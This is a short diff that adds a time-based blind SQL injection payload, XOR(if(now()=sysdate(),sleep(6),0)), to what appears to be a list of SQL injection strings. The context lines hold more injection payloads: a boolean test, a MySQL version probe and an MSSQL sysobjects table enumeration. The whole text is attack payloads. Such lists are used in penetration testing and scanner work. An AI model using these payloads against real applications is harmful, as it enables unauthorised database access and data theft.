@@ -55,3 +55,4 @@ AND false
 1 AND (SELECT * FROM Users) = 1    
 ' AND MID(VERSION(),1,1) = '5';
 ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+XOR(if(now()=sysdate(),sleep(6),0))XOR"Z
